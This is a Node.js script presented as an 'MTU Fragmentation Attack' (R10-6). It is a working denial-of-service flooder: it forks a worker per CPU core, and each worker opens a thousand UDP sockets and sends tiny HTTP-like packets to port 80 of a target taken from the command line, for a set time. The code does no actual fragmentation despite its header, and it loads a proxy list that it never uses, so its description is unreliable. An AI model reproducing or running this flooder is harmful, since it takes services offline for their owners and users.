// R10-6: PACKET-FRAGMENT - MTU Fragmentation Attack
// Focus: Network layer bypass
// Technique: Tiny packets + Fragmentation

const dgram = require('dgram');
const net = require('net');
const fs = require('fs');
const dns = require('dns');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];

// Load proxies
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-6] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-6] No proxy.txt found, running without proxies');
}

if (cluster.isMaster) {
    console.log(`[R10-6] PACKET-FRAGMENT launching on ${CPU_CORES} cores`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    const parsed = new URL(target);
    
    // Resolve IP
    dns.lookup(parsed.hostname, (err, ip) => {
        if (err) return;
        
        let packets = 0;
        const sockets = [];
        
        // Create UDP sockets
        for (let i = 0; i < 1000; i++) {
            const socket = dgram.createSocket('udp4');
            socket.unref();
            sockets.push(socket);
        }
        
        const interval = setInterval(() => {
            for (let s = 0; s < sockets.length; s++) {
                const socket = sockets[s];
                
                // Send tiny fragmented packets
                for (let i = 0; i < 10; i++) {
                    const data = Buffer.alloc(48);
                    const ua = Math.random().toString(36).substring(7);
                    data.write(`GET /${Math.random()} HTTP/1.1\r\nHost: ${parsed.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`);
                    
                    socket.send(data, 0, data.length, 80, ip, (err) => {
                        if (!err) packets++;
                    });
                }
            }
        }, 10);
        
        setInterval(() => {
            console.log(`[R10-6] Packets/sec: ${packets}`);
            packets = 0;
        }, 1000);
        
        setTimeout(() => {
            clearInterval(interval);
            sockets.forEach(s => {
                try { s.close(); } catch (e) {}
            });
            process.exit(0);
        }, time * 1000);
    });
}